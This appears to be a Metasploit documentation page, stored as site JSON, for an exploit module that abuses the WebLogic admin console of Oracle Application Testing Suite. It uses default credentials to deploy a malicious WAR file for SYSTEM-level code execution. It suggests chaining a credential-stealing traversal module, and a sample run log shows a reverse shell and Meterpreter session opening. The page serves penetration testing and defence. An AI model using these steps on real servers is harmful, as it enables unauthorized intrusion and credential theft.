{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/oats_weblogic_console","result":{"data":{"moduleMetadataJson":{"id":"312921b1-11a3-59cb-9488-6b5f5642bec7","name":"Oracle Application Testing Suite WebLogic Server Administration Console War Deployment","fullname":"exploit/windows/http/oats_weblogic_console","description":"This module abuses a feature in WebLogic Server's Administration Console to install\n        a malicious Java application in order to gain remote code execution. Authentication\n        is required, however by default, Oracle ships with a \"oats\" account that you could\n        log in with, which grants you administrator access.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/oats_weblogic_console","documentationSlug":"/modules/documentation/exploit/windows/http/oats_weblogic_console","referencesSlug":"/modules/references/exploit/windows/http/oats_weblogic_console"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Oracle Application Testing Suite (OATS) is a comprehensive, integrated testing solution for web applications, web services, packaged Oracle\napplications, and Oracle databases. OATS is part of an application deployed in the WebLogic service on port 8088, which also includes these\ntools: Administrator, OpenScript, Oracle Load Testing, and Oracle Test Manager.</p>\n<p>In the administrator console, the deployement feature can be abused to upload an arbitrary WAR file, allowing remote code execution under the\ncontext of SYSTEM. Authentication is required.</p>\n<p>The following is the exact setup I used to test and analyze the vulnerability:</p>\n<ul>\n<li>\n<p>Windows Server 2008 R2 x64 (other Windows systems are also supported)</p>\n<ul>\n<li>.Net Framework 3.5 enabled (from add/remove features)</li>\n<li>IE ESC (from Server Manager) disabled</li>\n<li>8GB of RAM (at least more than 4GB will be used to run OATS)</li>\n<li>Duel-Core processor</li>\n</ul>\n</li>\n<li>oats-win64-full-13.3.0.1.262.zip (x86 did not work for me)</li>\n<li>Jdk-7u21-windows-x64.exe</li>\n<li>OracleXE112_Win64.zip (Newer version 18c did not work well for me)</li>\n<li>Firefox (I had to install this because IE on Win2k8 is completely outdated)</li>\n<li>Adobe Flash installed (IE ESC needs to be disabled in order to install this)</li>\n</ul>\n<p>For installation instructions, please refer to the Oracle Application Testing Suite Installation Guide.</p>\n<h3 id=\"notes\" style=\"position:relative;\"><a href=\"#notes\" aria-label=\"notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes</h3>\n<p>For Oracle Application Testing Suite (OATS), you may use the <code class=\"language-text\">auxiliary/gather/oats_downloadservlet_traversal</code> module to download the server's encrypted\ncredentials, decrypt them using a third-party tool, and then use this module to gain remote code execution.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/http/oats_weblogic_console) &gt; check\n[*] 172.16.135.128:8088 - The target service is running, but could not be validated.\nmsf5 exploit(windows/http/oats_weblogic_console) &gt; run\n\n[*] Started reverse TCP handler on 172.16.135.1:4444 \n[+] Logged in as oats:VeryPhat1337\n[*] Ready for war. Codename &quot;lawrence&quot; at 6256 bytes\n[*] FRSC value: 0x59c5c771ae7d83c8440d7c45d2610dca5a0aa304a9e89e4c\n[*] Server replies: &quot;The file lawrence.war has been uploaded successfully to C:\\\\OracleATS\\\\oats\\\\servers\\\\AdminServer\\\\upload&quot;\n[+] Operation &quot;lawrence&quot; is a go!\n[*] Code 200 on &quot;lawrence&quot; request\n[*] Sending stage (53866 bytes) to 172.16.135.128\n[*] Meterpreter session 1 opened (172.16.135.1:4444 -&gt; 172.16.135.128:49337) at 2019-05-18 18:07:27 -0500\n[+] Successfully undeployed lawrence.war\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"312921b1-11a3-59cb-9488-6b5f5642bec7"}}}